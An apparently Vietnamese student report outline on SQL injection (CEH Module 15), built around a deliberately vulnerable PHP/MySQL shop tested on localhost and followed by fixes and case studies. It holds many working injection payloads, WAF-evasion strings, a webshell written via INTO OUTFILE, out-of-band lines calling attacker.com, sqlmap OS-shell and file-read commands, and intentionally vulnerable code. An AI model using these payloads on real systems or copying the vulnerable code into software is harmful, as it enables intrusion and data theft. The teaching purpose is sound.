# 📋 BÁO CÁO BÀI TẬP LỚN: CEH MODULE 15 - SQL INJECTION

> **Môn học:** An toàn Bảo mật Hệ thống Thông tin
> **Phương án:** Option C - Báo cáo Toàn diện + Xây dựng ứng dụng minh họa

---

## 📑 MỤC LỤC TỔNG QUAN

| STT | Chương | Nội dung chính | Số trang ước tính |
|-----|--------|---------------|-------------------|
| 1 | Giới thiệu | Bối cảnh, mục tiêu, phương pháp | 3-4 |
| 2 | Cơ sở lý thuyết | SQL, kiến trúc web, HTTP | 6-8 |
| 3 | Phân loại & Kỹ thuật tấn công | Tất cả loại SQLi + payload | 10-15 |
| 4 | Xây dựng ứng dụng minh họa | Thiết kế, code, cài lỗ hổng | 8-10 |
| 5 | Kịch bản tấn công | Demo từng loại SQLi | 10-15 |
| 6 | Sử dụng công cụ tự động | sqlmap, Burp Suite | 5-8 |
| 7 | Khắc phục lỗ hổng | Fix code, so sánh trước/sau | 8-10 |
| 8 | Biện pháp phòng chống tổng thể | Best practices, WAF, DevSecOps | 5-7 |
| 9 | Case Study & Thống kê | Vụ tấn công thực tế | 4-5 |
| 10 | Kết luận | Tổng kết, hạn chế, hướng phát triển | 2-3 |
| PL | Phụ lục | Source code, cài đặt, tài liệu | 5-10 |
| | **TỔNG** | | **~65-95 trang** |

---

## CHƯƠNG 1: GIỚI THIỆU

### 1.1 Đặt vấn đề
- Thực trạng an ninh mạng hiện nay (số liệu từ OWASP, CVE, Verizon DBIR)
- SQL Injection liên tục nằm trong **OWASP Top 10** (A03:2021 - Injection)
- Thống kê thiệt hại do SQL Injection gây ra trên toàn cầu
- Tại sao SQL Injection vẫn phổ biến dù là lỗ hổng "cũ"?

### 1.2 Mục tiêu nghiên cứu
- Hiểu rõ nguyên lý hoạt động của SQL Injection
- Phân loại và thực hành các kỹ thuật tấn công
- Xây dựng ứng dụng web có chứa lỗ hổng để minh họa
- Đề xuất biện pháp phòng chống hiệu quả

### 1.3 Phạm vi nghiên cứu
- Dựa trên CEH Module 15 - SQL Injection
- Tập trung vào các DBMS phổ biến: MySQL, MSSQL
- Ứng dụng minh họa xây dựng bằng PHP + MySQL
- Công cụ: sqlmap, Burp Suite

### 1.4 Phương pháp nghiên cứu
- Nghiên cứu tài liệu (CEH courseware, OWASP, SANS)
- Thực nghiệm trên môi trường lab tự xây dựng
- Phân tích case study thực tế

---

## CHƯƠNG 2: CƠ SỞ LÝ THUYẾT

### 2.1 Tổng quan về SQL (Structured Query Language)
- Lịch sử phát triển SQL
- Các câu lệnh cơ bản:
  - **DDL:** CREATE, ALTER, DROP
  - **DML:** SELECT, INSERT, UPDATE, DELETE
  - **DCL:** GRANT, REVOKE
- Các mệnh đề quan trọng: WHERE, UNION, ORDER BY, GROUP BY, HAVING
- Subquery và Stored Procedures
- Các hàm đặc biệt liên quan đến khai thác:
  - `INFORMATION_SCHEMA`
  - `@@version`, `database()`, `user()`
  - `LOAD_FILE()`, `INTO OUTFILE`
  - `CONCAT()`, `GROUP_CONCAT()`
  - `SLEEP()`, `BENCHMARK()`
  - `SUBSTRING()`, `ASCII()`, `LENGTH()`

### 2.2 Kiến trúc ứng dụng web
- Mô hình Client-Server
- Kiến trúc 3 tầng:
  - **Presentation Layer** (Frontend - HTML/CSS/JS)
  - **Application Layer** (Backend - PHP/Python/Java)
  - **Data Layer** (Database - MySQL/MSSQL/Oracle)
- Luồng xử lý request:
  ```
  User Input → HTTP Request → Web Server → Application Code → SQL Query → Database → Response
  ```
- Vẽ sơ đồ minh họa kiến trúc

### 2.3 Giao thức HTTP và Form Handling
- HTTP Methods: GET vs POST
- Cách dữ liệu được truyền qua URL (GET) và Body (POST)
- HTTP Headers quan trọng: Cookie, User-Agent, Referer
- URL Encoding và các ký tự đặc biệt
- Ví dụ request thực tế:
  ```
  GET /search.php?id=1 HTTP/1.1
  Host: example.com
  ```

### 2.4 Cơ chế xử lý Input trong ứng dụng web
- Input trực tiếp: Form, URL parameters
- Input gián tiếp: Cookies, HTTP Headers, File uploads
- **Code không an toàn** (vulnerable):
  ```php
  $id = $_GET['id'];
  $sql = "SELECT * FROM users WHERE id = '$id'";
  $result = mysqli_query($conn, $sql);
  ```
- Giải thích tại sao đoạn code trên bị lỗi SQL Injection

### 2.5 SQL Injection là gì?
- **Định nghĩa chính thức** (theo OWASP, CEH)
- Nguyên nhân gốc rễ: **Thiếu kiểm tra/lọc input + Ghép chuỗi SQL trực tiếp**
- Sơ đồ minh họa quá trình tấn công:
  ```
  Input: ' OR 1=1 --
  Query gốc:  SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'abc'
  Kết quả:    Bypass authentication → Truy cập trái phép
  ```
- Hậu quả tiềm tàng:
  - Đánh cắp dữ liệu (data theft)
  - Bypass authentication
  - Sửa đổi/xóa dữ liệu
  - Chiếm quyền điều khiển server (RCE)
  - Tấn công DOS

---

## CHƯƠNG 3: PHÂN LOẠI VÀ KỸ THUẬT TẤN CÔNG SQL INJECTION

### 3.1 Tổng quan phân loại
Vẽ sơ đồ cây (mindmap) phân loại:
```
SQL Injection
├── In-band SQLi (Classic)
│   ├── Error-based
│   └── UNION-based
├── Blind SQLi (Inferential)
│   ├── Boolean-based
│   └── Time-based
└── Out-of-band SQLi
```

### 3.2 In-band SQL Injection (Classic SQLi)

#### 3.2.1 Error-based SQL Injection
- **Nguyên lý:** Lợi dụng thông báo lỗi của database để trích xuất thông tin
- **Điều kiện:** Ứng dụng hiển thị error message cho người dùng
- **Payload mẫu:**
  ```sql
  -- MySQL
  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --
  ' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --

  -- MSSQL
  ' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --
  ```
- **Thông tin có thể trích xuất:**
  - Phiên bản DB
  - Tên database hiện tại
  - Tên bảng, tên cột
  - Dữ liệu trong bảng

#### 3.2.2 UNION-based SQL Injection
- **Nguyên lý:** Dùng UNION SELECT để ghép kết quả truy vấn của attacker vào kết quả gốc
- **Các bước thực hiện:**
  1. **Xác định số cột:** `ORDER BY 1--`, `ORDER BY 2--`... cho đến khi lỗi
  2. **Tìm cột hiển thị:** `UNION SELECT 1,2,3,4--`
  3. **Trích xuất thông tin:**
     ```sql
     ' UNION SELECT 1, database(), version(), user() --
     ' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database() --
     ' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='users' --
     ' UNION SELECT 1, username, password, 4 FROM users --
     ```
- **Lưu ý kỹ thuật:**
  - Số cột UNION phải bằng số cột query gốc
  - Kiểu dữ liệu phải tương thích
  - Có thể dùng `NULL` thay cho giá trị cụ thể

### 3.3 Blind SQL Injection (Inferential SQLi)

#### 3.3.1 Boolean-based Blind SQLi
- **Nguyên lý:** Không thấy output trực tiếp, phán đoán dựa trên **sự khác biệt phản hồi** (true/false)
- **Ví dụ:**
  ```sql
  -- Kiểm tra ký tự đầu tiên của database name
  ' AND SUBSTRING(database(),1,1) = 'a' --   → Trang bình thường = đúng
  ' AND SUBSTRING(database(),1,1) = 'b' --   → Trang khác = sai
  
  -- Dùng ASCII để tự động hóa
  ' AND ASCII(SUBSTRING(database(),1,1)) > 100 --
  ' AND ASCII(SUBSTRING(database(),1,1)) > 110 --
  -- Dùng binary search để tìm nhanh hơn
  ```
- **Quy trình khai thác:**
  1. Xác nhận injection point
  2. Xác định độ dài chuỗi cần lấy: `LENGTH(database()) = N`
  3. Lấy từng ký tự bằng SUBSTRING + ASCII
  4. Ghép lại thành chuỗi hoàn chỉnh

#### 3.3.2 Time-based Blind SQLi
- **Nguyên lý:** Phán đoán dựa trên **thời gian phản hồi** của server
- **Payload mẫu:**
  ```sql
  -- MySQL
  ' AND IF(1=1, SLEEP(5), 0) --    → Delay 5s = TRUE
  ' AND IF(1=2, SLEEP(5), 0) --    → Không delay = FALSE
  
  -- Trích xuất dữ liệu
  ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --
  
  -- MSSQL
  '; WAITFOR DELAY '0:0:5' --
  '; IF (SELECT COUNT(*) FROM sysobjects WHERE xtype='U') > 0 WAITFOR DELAY '0:0:5' --
  ```
- **Nhược điểm:** Rất chậm, phụ thuộc vào network latency

### 3.4 Out-of-band SQL Injection
- **Nguyên lý:** Dữ liệu được gửi qua kênh khác (DNS, HTTP request đến server attacker)
- **Điều kiện:** Database server có thể thực hiện kết nối ra ngoài
- **Payload mẫu:**
  ```sql
  -- MySQL (cần FILE privilege)
  SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
  
  -- MSSQL (dùng xp_dirtree)
  EXEC master..xp_dirtree '\\attacker.com\share';
  
  -- Oracle (dùng UTL_HTTP)
  SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual;
  ```
- **Ưu điểm:** Bypass được nhiều biện pháp bảo vệ
- **Use case:** Khi cả error-based và blind đều bị chặn

### 3.5 Các kỹ thuật nâng cao

#### 3.5.1 Bypass Authentication
```sql
-- Login bypass
Username: admin' --
Password: anything

Username: ' OR 1=1 --
Password: anything

Username: admin' /*
Password: */ OR '1'='1
```

#### 3.5.2 Stacked Queries (Batched Queries)
```sql
-- Chèn thêm câu lệnh SQL sau dấu ;
'; DROP TABLE users; --
'; INSERT INTO users(username, password) VALUES ('hacker', 'pass123'); --
'; UPDATE users SET role='admin' WHERE username='hacker'; --
```

#### 3.5.3 Second-Order SQL Injection
- Input được lưu vào database trước, sau đó được sử dụng trong query khác
- Ví dụ: Đăng ký user với tên `admin'--`, khi đổi mật khẩu sẽ đổi mật khẩu của admin

#### 3.5.4 Filter Bypass / WAF Evasion
```sql
-- Bypass space filter
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users

-- Bypass keyword filter  
SeLeCt, SELE/**/CT
UNION ALL SELECT
UN/**/ION SE/**/LECT

-- Bypass quote filter
SELECT CHAR(97,100,109,105,110)  -- 'admin'
SELECT 0x61646D696E              -- 'admin' hex

-- URL Encoding
%27 = '
%23 = #
%2D%2D = --

-- Double URL Encoding
%2527 = %27 = '
```

#### 3.5.5 Đọc/Ghi File hệ thống (MySQL)
```sql
-- Đọc file
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4 --

-- Ghi file (webshell)
' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3, 4 INTO OUTFILE '/var/www/html/shell.php' --
```

---

## CHƯƠNG 4: XÂY DỰNG ỨNG DỤNG WEB MINH HỌA

### 4.1 Mô tả ứng dụng
- **Tên:** VulnShop - Hệ thống quản lý cửa hàng trực tuyến (giả lập)
- **Chức năng:**
  - Đăng nhập / Đăng ký
  - Tìm kiếm sản phẩm
  - Xem chi tiết sản phẩm
  - Trang quản trị (admin panel)
- **Mục đích:** Mỗi chức năng được cài 1 loại lỗ hổng SQL Injection khác nhau

### 4.2 Công nghệ sử dụng
- **Frontend:** HTML, CSS, JavaScript
- **Backend:** PHP 8.x
- **Database:** MySQL 8.x
- **Server:** Apache (XAMPP) hoặc Docker
- **Công cụ hỗ trợ:** phpMyAdmin

### 4.3 Thiết kế cơ sở dữ liệu

#### ERD (Entity-Relationship Diagram)
Vẽ sơ đồ ERD gồm các bảng:

```sql
-- Bảng users (lưu thông tin người dùng)
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(100),
    role ENUM('user', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Bảng products (sản phẩm)
CREATE TABLE products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(200) NOT NULL,
    description TEXT,
    price DECIMAL(10,2),
    category VARCHAR(50),
    stock INT DEFAULT 0,
    image_url VARCHAR(255)
);

-- Bảng orders (đơn hàng)
CREATE TABLE orders (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    total_amount DECIMAL(10,2),
    status ENUM('pending', 'completed', 'cancelled') DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Bảng sensitive_data (dữ liệu nhạy cảm - để demo trích xuất)
CREATE TABLE sensitive_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    card_number VARCHAR(20),
    card_holder VARCHAR(100),
    expiry_date VARCHAR(10),
    cvv VARCHAR(5)
);
```

#### Dữ liệu mẫu
```sql
INSERT INTO users VALUES 
(1, 'admin', MD5('admin123'), 'admin@vulnshop.com', 'admin', NOW()),
(2, 'user1', MD5('password'), 'user1@gmail.com', 'user', NOW()),
(3, 'john', MD5('john2024'), 'john@gmail.com', 'user', NOW());

INSERT INTO products VALUES
(1, 'iPhone 15 Pro', 'Latest Apple smartphone', 999.99, 'Electronics', 50, 'iphone.jpg'),
(2, 'Samsung Galaxy S24', 'Flagship Samsung phone', 899.99, 'Electronics', 30, 'samsung.jpg'),
-- ... thêm 8-10 sản phẩm
;

INSERT INTO sensitive_data VALUES
(1, '4111-1111-1111-1111', 'John Doe', '12/25', '123'),
(2, '5500-0000-0000-0004', 'Jane Smith', '06/26', '456');
```

### 4.4 Cấu trúc thư mục dự án
```
vulnshop/
├── index.php              # Trang chủ
├── login.php              # Đăng nhập (Vuln: Authentication Bypass)
├── register.php           # Đăng ký (Vuln: Second-Order SQLi)
├── search.php             # Tìm kiếm (Vuln: UNION-based SQLi)
├── product.php            # Chi tiết SP (Vuln: Error-based SQLi)
├── profile.php            # Hồ sơ (Vuln: Blind Boolean SQLi)
├── feedback.php           # Phản hồi (Vuln: Time-based Blind SQLi)
├── admin/
│   ├── dashboard.php      # Trang quản trị
│   └── manage_users.php   # Quản lý user
├── includes/
│   ├── db_connect.php     # Kết nối DB (KHÔNG an toàn)
│   ├── db_secure.php      # Kết nối DB (AN TOÀN - dùng cho chương 7)
│   ├── header.php
│   └── footer.php
├── css/
│   └── style.css
├── js/
│   └── main.js
├── setup/
│   ├── database.sql       # Script tạo DB
│   └── install.php        # Script cài đặt tự động
└── README.md
```

### 4.5 Code các trang có lỗ hổng

#### 4.5.1 login.php - Authentication Bypass
```php
<?php
// ⚠️ CODE CÓ LỖ HỔNG - DÙNG ĐỂ DEMO
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$username' AND password = MD5('$password')";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {
    // Đăng nhập thành công
    $_SESSION['user'] = mysqli_fetch_assoc($result);
    header("Location: dashboard.php");
}
```
**Lỗ hổng:** Ghép chuỗi trực tiếp → Attacker nhập `admin' --` để bypass

#### 4.5.2 search.php - UNION-based SQLi
```php
<?php
// ⚠️ CODE CÓ LỖ HỔNG
$keyword = $_GET['q'];
$sql = "SELECT id, name, price, category FROM products WHERE name LIKE '%$keyword%'";
$result = mysqli_query($conn, $sql);

while ($row = mysqli_fetch_assoc($result)) {
    echo "<tr><td>{$row['id']}</td><td>{$row['name']}</td><td>{$row['price']}</td><td>{$row['category']}</td></tr>";
}
```
**Lỗ hổng:** Input từ GET parameter được ghép trực tiếp → UNION SELECT injection

#### 4.5.3 product.php - Error-based SQLi
```php
<?php
// ⚠️ CODE CÓ LỖ HỔNG
$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = $id";
$result = mysqli_query($conn, $sql);

if (!$result) {
    echo "Error: " . mysqli_error($conn); // Hiển thị lỗi SQL
}
```
**Lỗ hổng:** Không có quote quanh $id + hiển thị error message

#### 4.5.4 profile.php - Boolean-based Blind SQLi
```php
<?php
// ⚠️ CODE CÓ LỖ HỔNG
$user_id = $_GET['uid'];
$sql = "SELECT username, email FROM users WHERE id = $user_id";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {
    $user = mysqli_fetch_assoc($result);
    echo "<h2>Profile: {$user['username']}</h2>";
} else {
    echo "<h2>User not found</h2>";
}
```
**Lỗ hổng:** Phản hồi khác nhau (tìm thấy / không tìm thấy) → Boolean-based blind

#### 4.5.5 feedback.php - Time-based Blind SQLi
```php
<?php
// ⚠️ CODE CÓ LỖ HỔNG
$product_id = $_POST['product_id'];
$comment = $_POST['comment'];

$sql = "INSERT INTO feedbacks (product_id, comment) VALUES ($product_id, '$comment')";
mysqli_query($conn, $sql);

echo "Thank you for your feedback!"; // Luôn trả về cùng 1 message
```
**Lỗ hổng:** Không có sự khác biệt phản hồi → Chỉ khai thác được bằng time-based

---

## CHƯƠNG 5: KỊCH BẢN TẤN CÔNG (DEMO THỰC HÀNH)

> **Mỗi kịch bản gồm:** Mục tiêu → Bước thực hiện → Screenshot → Kết quả → Giải thích

### 5.1 Kịch bản 1: Bypass Login (Authentication Bypass)
- **Mục tiêu:** Đăng nhập vào tài khoản admin mà không cần mật khẩu
- **Trang tấn công:** `login.php`
- **Payload:**
  ```
  Username: admin' --
  Password: anything
  ```
- **Query thực tế:**
  ```sql
  SELECT * FROM users WHERE username = 'admin' --' AND password = MD5('anything')
  ```
- **Kết quả:** Truy cập được admin dashboard
- **Chụp screenshot trước/sau**

### 5.2 Kịch bản 2: Trích xuất dữ liệu bằng UNION SELECT
- **Mục tiêu:** Lấy danh sách username + password từ bảng users
- **Trang tấn công:** `search.php`
- **Các bước:**
  1. Xác định số cột: `' ORDER BY 1-- ` → `' ORDER BY 5-- ` (lỗi tại 5 → có 4 cột)
  2. Tìm cột hiển thị: `' UNION SELECT 1,2,3,4-- `
  3. Lấy tên database: `' UNION SELECT 1,database(),version(),user()-- `
  4. Liệt kê bảng: `' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- `
  5. Liệt kê cột bảng users: `' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- `
  6. Dump dữ liệu: `' UNION SELECT 1,username,password,email FROM users-- `
  7. Dump dữ liệu nhạy cảm: `' UNION SELECT 1,card_number,card_holder,cvv FROM sensitive_data-- `
- **Chụp screenshot từng bước**

### 5.3 Kịch bản 3: Error-based Data Extraction
- **Mục tiêu:** Trích xuất thông tin qua error message
- **Trang tấn công:** `product.php`
- **Payload:**
  ```
  product.php?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))
  product.php?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e))
  ```
- **Screenshot error chứa dữ liệu**

### 5.4 Kịch bản 4: Boolean-based Blind Injection
- **Mục tiêu:** Xác định tên database ký tự một
- **Trang tấn công:** `profile.php`
- **Quy trình:**
  ```
  profile.php?uid=1 AND 1=1    → "Profile: admin"     (TRUE)
  profile.php?uid=1 AND 1=2    → "User not found"     (FALSE)
  
  profile.php?uid=1 AND LENGTH(database())=8           → TRUE (db name có 8 ký tự)
  profile.php?uid=1 AND SUBSTRING(database(),1,1)='v'  → TRUE (ký tự đầu là 'v')
  profile.php?uid=1 AND SUBSTRING(database(),2,1)='u'  → TRUE (ký tự thứ 2 là 'u')
  ... tiếp tục cho đến khi lấy được tên: "vulnshop"
  ```
- **Tạo bảng kết quả từng ký tự**

### 5.5 Kịch bản 5: Time-based Blind Injection
- **Mục tiêu:** Trích xuất dữ liệu khi không có sự khác biệt phản hồi
- **Trang tấn công:** `feedback.php`
- **Payload:**
  ```
  product_id=1; IF(SUBSTRING(database(),1,1)='v', SLEEP(5), 0)-- 
  ```
- **Đo thời gian phản hồi:** 
  - Response time > 5s → TRUE
  - Response time < 1s → FALSE
- **Tạo bảng so sánh thời gian phản hồi**

### 5.6 Kịch bản 6: Stacked Queries / Thêm admin account
- **Mục tiêu:** Tạo tài khoản admin mới
- **Payload:**
  ```sql
  '; INSERT INTO users(username, password, role) VALUES('hacker', MD5('hacked'), 'admin'); --
  ```
- **Kiểm chứng:** Login thành công với tài khoản mới

---

## CHƯƠNG 6: SỬ DỤNG CÔNG CỤ TỰ ĐỘNG

### 6.1 sqlmap

#### 6.1.1 Giới thiệu sqlmap
- Open-source, tự động phát hiện và khai thác SQL Injection
- Hỗ trợ nhiều DBMS: MySQL, MSSQL, Oracle, PostgreSQL, SQLite...
- Các tính năng chính: detection, exploitation, data extraction, file access, OS command

#### 6.1.2 Demo sqlmap trên VulnShop
```bash
# Phát hiện lỗ hổng
sqlmap -u "http://localhost/vulnshop/search.php?q=test" --dbs

# Liệt kê database
sqlmap -u "http://localhost/vulnshop/search.php?q=test" --dbs

# Liệt kê bảng
sqlmap -u "http://localhost/vulnshop/search.php?q=test" -D vulnshop --tables

# Liệt kê cột
sqlmap -u "http://localhost/vulnshop/search.php?q=test" -D vulnshop -T users --columns

# Dump dữ liệu
sqlmap -u "http://localhost/vulnshop/search.php?q=test" -D vulnshop -T users --dump

# Dump toàn bộ database
sqlmap -u "http://localhost/vulnshop/search.php?q=test" -D vulnshop --dump-all

# Lấy OS shell (nếu có quyền)
sqlmap -u "http://localhost/vulnshop/product.php?id=1" --os-shell

# Đọc file hệ thống
sqlmap -u "http://localhost/vulnshop/product.php?id=1" --file-read="/etc/passwd"
```

#### 6.1.3 Phân tích output sqlmap
- Screenshot kết quả từng lệnh
- Giải thích các tham số quan trọng
- So sánh tốc độ vs tấn công thủ công

### 6.2 Burp Suite

#### 6.2.1 Giới thiệu Burp Suite
- Công cụ proxy & testing bảo mật web hàng đầu
- Các module liên quan: Proxy, Repeater, Intruder, Scanner

#### 6.2.2 Demo với Burp Suite
- **Intercept request:** Bắt và chỉnh sửa request trước khi gửi đến server
- **Repeater:** Gửi payload và quan sát response
- **Intruder:** Tự động hóa brute-force payload (ví dụ: tìm số cột bằng ORDER BY)
- **Screenshot từng bước**

### 6.3 So sánh tấn công thủ công vs tự động

| Tiêu chí | Thủ công | sqlmap | Burp Suite |
|----------|---------|--------|------------|
| Tốc độ | Chậm | Nhanh | Trung bình |
| Chính xác | Cao | Cao | Cao |
| Linh hoạt | Rất cao | Trung bình | Cao |
| Học tập | Hiểu sâu | Dễ dùng | Cần kinh nghiệm |
| WAF Bypass | Tùy kỹ năng | Có tamper scripts | Tốt |

---

## CHƯƠNG 7: KHẮC PHỤC LỖ HỔNG

> **Quan trọng:** Mỗi trang vulnerable đều có phiên bản FIX tương ứng, so sánh code trước/sau

### 7.1 Prepared Statements / Parameterized Queries

#### 7.1.1 Trước khi fix (Vulnerable)
```php
// ❌ VULNERABLE
$sql = "SELECT * FROM users WHERE username = '$username' AND password = MD5('$password')";
$result = mysqli_query($conn, $sql);
```

#### 7.1.2 Sau khi fix (Secure)
```php
// ✅ SECURE - Prepared Statement (MySQLi)
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = MD5(?)");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

```php
// ✅ SECURE - Prepared Statement (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = MD5(:password)");
$stmt->execute(['username' => $username, 'password' => $password]);
$result = $stmt->fetchAll();
```

### 7.2 Input Validation & Sanitization
```php
// Whitelist validation (cho numeric input)
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false || $id === null) {
    die("Invalid product ID");
}

// Sanitize string input
$keyword = mysqli_real_escape_string($conn, $_GET['q']);
$keyword = htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');

// Regex validation
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username format");
}
```

### 7.3 Error Handling an toàn
```php
// ❌ VULNERABLE - Hiển thị lỗi SQL cho người dùng
if (!$result) {
    echo "SQL Error: " . mysqli_error($conn);
}

// ✅ SECURE - Log lỗi nội bộ, hiển thị thông báo chung
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php_errors.log');

if (!$result) {
    error_log("SQL Error: " . mysqli_error($conn));
    echo "An error occurred. Please try again later.";
}
```

### 7.4 Stored Procedures
```sql
-- Tạo stored procedure an toàn
DELIMITER //
CREATE PROCEDURE sp_login(IN p_username VARCHAR(50), IN p_password VARCHAR(255))
BEGIN
    SELECT id, username, role FROM users 
    WHERE username = p_username AND password = MD5(p_password);
END //
DELIMITER ;
```

```php
// Gọi stored procedure từ PHP
$stmt = $conn->prepare("CALL sp_login(?, ?)");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

### 7.5 Least Privilege Principle
```sql
-- ❌ Ứng dụng sử dụng root account
-- GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost';

-- ✅ Tạo user riêng cho ứng dụng với quyền tối thiểu
CREATE USER 'webapp_user'@'localhost' IDENTIFIED BY 'strong_password_here';
GRANT SELECT, INSERT, UPDATE ON vulnshop.products TO 'webapp_user'@'localhost';
GRANT SELECT ON vulnshop.users TO 'webapp_user'@'localhost';
-- KHÔNG cấp FILE, DROP, CREATE, ALTER, EXECUTE
FLUSH PRIVILEGES;
```

### 7.6 Bảng so sánh trước/sau fix

| Trang | Loại SQLi | Code trước | Code sau | Biện pháp áp dụng |
|-------|----------|-----------|---------|-------------------|
| login.php | Auth Bypass | String concat | Prepared Statement | 7.1 |
| search.php | UNION-based | String concat | Prepared Statement + Input Validation | 7.1 + 7.2 |
| product.php | Error-based | No quotes + error display | Prepared Statement + Error Handling | 7.1 + 7.3 |
| profile.php | Boolean Blind | No parameterization | Prepared Statement + Type casting | 7.1 + 7.2 |
| feedback.php | Time-based Blind | String concat | Prepared Statement | 7.1 |

### 7.7 Kiểm tra lại sau khi fix
- Chạy lại tất cả payload ở Chương 5 trên phiên bản đã fix
- Chạy lại sqlmap → Xác nhận **không còn phát hiện lỗ hổng**
- Screenshot kết quả "safe"

---

## CHƯƠNG 8: BIỆN PHÁP PHÒNG CHỐNG TỔNG THỂ

### 8.1 Phòng chống ở tầng Application
- **Parameterized Queries** (đã trình bày ở Chương 7)
- **ORM (Object-Relational Mapping):** Eloquent, Hibernate, SQLAlchemy
- **Input Validation:** Whitelist > Blacklist
- **Output Encoding:** htmlspecialchars, htmlentities
- **Stored Procedures** với quyền hạn chế

### 8.2 Phòng chống ở tầng Database
- **Least Privilege Principle:** Tối thiểu hóa quyền
- **Tắt các tính năng nguy hiểm:**
  - MySQL: `local_infile=0`, `secure_file_priv`
  - MSSQL: `xp_cmdshell` off
- **Mã hóa dữ liệu nhạy cảm:** bcrypt/argon2 cho password, AES cho dữ liệu
- **Database Activity Monitoring (DAM)**

### 8.3 Phòng chống ở tầng Network
- **Web Application Firewall (WAF):** ModSecurity, Cloudflare WAF, AWS WAF
  - Giải thích rule set OWASP CRS
  - Demo chặn payload SQLi
- **IDS/IPS:** Snort, Suricata
- **Network Segmentation:** Tách web server và DB server

### 8.4 Phòng chống ở tầng Process
- **Secure SDLC:** Security by Design
- **Code Review:** Checklist review SQL Injection
- **SAST (Static Application Security Testing):** SonarQube, Checkmarx
- **DAST (Dynamic Application Security Testing):** OWASP ZAP, Acunetix
- **Penetration Testing:** Định kỳ test thâm nhập
- **Security Training:** Đào tạo developer about secure coding

### 8.5 Bảng tổng hợp biện pháp

| Tầng | Biện pháp | Hiệu quả | Chi phí | Ưu tiên |
|------|----------|----------|---------|---------|
| Application | Prepared Statements | ⭐⭐⭐⭐⭐ | Thấp | **BẮT BUỘC** |
| Application | Input Validation | ⭐⭐⭐⭐ | Thấp | **BẮT BUỘC** |
| Application | Error Handling | ⭐⭐⭐ | Thấp | Cao |
| Database | Least Privilege | ⭐⭐⭐⭐ | Thấp | **BẮT BUỘC** |
| Database | Encryption | ⭐⭐⭐ | Trung bình | Cao |
| Network | WAF | ⭐⭐⭐⭐ | Cao | Cao |
| Network | IDS/IPS | ⭐⭐⭐ | Cao | Trung bình |
| Process | SAST/DAST | ⭐⭐⭐⭐ | Trung bình | Cao |
| Process | Pen Testing | ⭐⭐⭐⭐⭐ | Cao | Cao |

---

## CHƯƠNG 9: CASE STUDY VÀ THỐNG KÊ

### 9.1 Case Study 1: Heartland Payment Systems (2008)
- **Thiệt hại:** 130 triệu thẻ tín dụng bị lộ
- **Kỹ thuật:** SQL Injection → cài malware vào hệ thống thanh toán
- **Hậu quả:** Phạt $110 triệu, CEO bị điều tra
- **Bài học:** Cần monitoring + encryption at rest

### 9.2 Case Study 2: Sony Pictures (2011)
- **Thiệt hại:** 77 triệu tài khoản PlayStation Network
- **Kỹ thuật:** UNION-based SQL Injection
- **Hậu quả:** Sony tạm ngừng dịch vụ 23 ngày, mất $171 triệu
- **Bài học:** Không mã hóa password (plaintext!)

### 9.3 Case Study 3: TalkTalk (2015)
- **Thiệt hại:** 157,000 khách hàng bị lộ thông tin
- **Kẻ tấn công:** Thiếu niên 15-17 tuổi
- **Kỹ thuật:** SQL Injection cơ bản
- **Hậu quả:** Phạt £400,000 bởi ICO
- **Bài học:** SQL Injection cơ bản vẫn nguy hiểm

### 9.4 Thống kê đáng chú ý
- OWASP Top 10: Injection luôn trong top 3 từ 2010-2021
- Theo Akamai: 65% web attacks là SQL Injection (liên hệ nguồn)
- Theo HackerOne: SQLi là lỗ hổng được báo cáo nhiều thứ 2 trong bug bounty
- CVE database: Số lượng CVE liên quan SQLi theo năm (biểu đồ)

---

## CHƯƠNG 10: KẾT LUẬN

### 10.1 Tổng kết kết quả
- Đã trình bày đầy đủ lý thuyết về SQL Injection theo CEH Module 15
- Đã xây dựng thành công ứng dụng VulnShop minh họa 5 loại SQLi
